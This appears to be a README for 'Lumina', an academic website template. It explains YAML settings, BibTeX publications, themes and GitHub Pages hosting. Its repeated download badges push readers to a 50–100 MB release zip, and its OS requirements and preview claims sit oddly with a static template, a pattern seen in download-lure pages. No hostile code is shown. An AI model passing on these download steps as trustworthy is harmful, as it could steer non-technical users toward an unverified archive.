# 🌟 Lumina - Easy Academic Website Creation

[![Download Lumina](https://img.shields.io/badge/Download-Lumina-blue?style=for-the-badge)](https://github.com/Plizzylol/Lumina/releases)

---

## 📖 About Lumina

Lumina is an academic website template built for researchers who want to showcase their work simply and professionally. It uses one easy-to-edit YAML file for settings, supports BibTeX for publications, and offers many themes and color choices. Lumina is powered by modern tools but does not require technical skills to set up.

With Lumina, you get:

- A clean design for academic portfolios and research showcases.
- Support for 18 different types of pages (like About, Publications, Projects).
- Over 10 themes combined with 50 color palettes for personalization.
- Automated handling of publications using BibTeX files.
- Dark mode support for easy reading.
- Compatibility with GitHub Pages, so you can host your site for free.

---

## 🚀 Getting Started

Lumina works on Windows and Mac computers with common software installed. You don’t need to know programming; the steps involve downloading files and editing simple text files.

### What you need before starting:

- A Windows (7 or later) or Mac (macOS 10.13 or later) computer.
- An internet connection to download files.
- A plain text editor like Notepad (Windows) or TextEdit (Mac).
- Basic computer skills like downloading, unzipping, and opening files.

---

## 📥 Download & Install

To get Lumina, visit the releases page to download the latest version:

[![Download Lumina](https://img.shields.io/badge/Download-Lumina-blue?style=for-the-badge)](https://github.com/Plizzylol/Lumina/releases)

**Steps to download and start using Lumina:**

1. Click the blue “Download Lumina” button above or go directly to the [Lumina releases page](https://github.com/Plizzylol/Lumina/releases).

2. On the releases page, find the latest release. Look for files ending with `.zip`. Usually, the file name will mention "Lumina" and the version number.

3. Click the `.zip` file to download it. The file size is around 50-100 MB.

4. Once downloaded, open the `.zip` file by double-clicking it. This will unzip a folder named something like `Lumina-vX.X.X`.

5. Move the unzipped folder to a location where you want to keep your website files, such as your Desktop or Documents.

---

## 🛠️ Setting Up Your Website

Lumina uses a simple YAML file to manage your site content and settings. You don’t need to write code, just edit a text file.

### How to edit your website details:

1. Open the `config.yaml` file in the unzipped Lumina folder with your text editor.

2. Inside `config.yaml`, you will see sections like `site_name`, `author`, `theme`, and `palette`. Change these fields to match your preferences. For example:

   ```yaml
   site_name: "Dr. Jane Smith's Research"
   author: "Jane Smith"
   theme: "modern"
   palette: "blue"
   ```

3. Save the file after making changes.

---

## 📰 Adding Your Publications

Lumina reads your publications from a BibTeX file, which is a standard format used by researchers.

### How to add your publications:

1. Find the `publications.bib` file in the Lumina folder.

2. Open `publications.bib` with your text editor. It contains entries that look like this:

   ```
   @article{sample2020,
     title={Sample Research Paper},
     author={Smith, Jane},
     journal={Journal of Examples},
     year={2020}
   }
   ```

3. Replace the example entries with your own using the same format. If you don’t use BibTeX, you can find tools online that help create these entries or copy from your existing files.

4. Save the file once your publications are added.

---

## 🎨 Choosing Your Look

Lumina offers 10 themes and over 50 color palettes. You can mix and match to create a style that suits you.

### How to change themes and palettes:

- Open `config.yaml` in your text editor.
- Change the `theme` and `palette` entries to any option you prefer. For example:

  ```yaml
  theme: "classic"
  palette: "green"
  ```

- Save the file and your site will update to the new style.

---

## 🖥️ Viewing and Publishing Your Site

Lumina generates website files you can host anywhere. The simplest way to publish is using GitHub Pages, which is free.

### Preview your website locally:

1. Lumina uses Astro and Tailwind CSS, which normally require installation of extra software. But for quick preview, a lightweight method is available:

   - Locate the `index.html` file inside the unzipped folder.
   - Double-click `index.html` to open it in your web browser.
   - This shows a basic preview with your content and styles.

### Publishing your site for free on GitHub Pages:

1. Create a GitHub account at https://github.com if you don’t have one.

2. Create a new repository named `yourusername.github.io` (replace `yourusername` with your GitHub name).

3. Upload all files from your Lumina folder to this repository. You can do this by clicking “Add file” > “Upload files” on GitHub.

4. After uploading, your site will be live at `https://yourusername.github.io` within minutes.

5. For detailed steps, visit the GitHub Pages documentation: https://pages.github.com

---

## ⚙️ System Requirements

Lumina works best on modern computers and browsers. Requirements include:

- Windows 7 or newer, or macOS 10.13 or newer.
- Web browsers like Chrome, Firefox, Safari, or Edge.
- Internet connection to download and publish your website.

---

## 🤔 Troubleshooting Tips

- If the downloaded `.zip` file doesn’t open: Ensure you are using built-in extractor software like Windows Explorer or Finder on Mac.

- If the site preview looks off: Refresh the browser or clear cache to see recent changes.

- If you see errors in the BibTeX file: Check for missing brackets or commas.

- For help with GitHub Pages, search for “GitHub Pages beginner guide.”

---

## 📂 More Resources

- [Lumina Documentation](https://github.com/Plizzylol/Lumina/wiki) - Detailed user guide and tips.

- [YAML Tutorial](https://yaml.org/start.html) - Learn how to edit configuration files.

- [BibTeX Guide](https://en.wikipedia.org/wiki/BibTeX) - Learn about formatting publications.

- [GitHub Pages](https://pages.github.com) - Official hosting guide.

---

Lumina makes creating a professional academic website straightforward. Download it now, customize it with your information, and share your work with the world.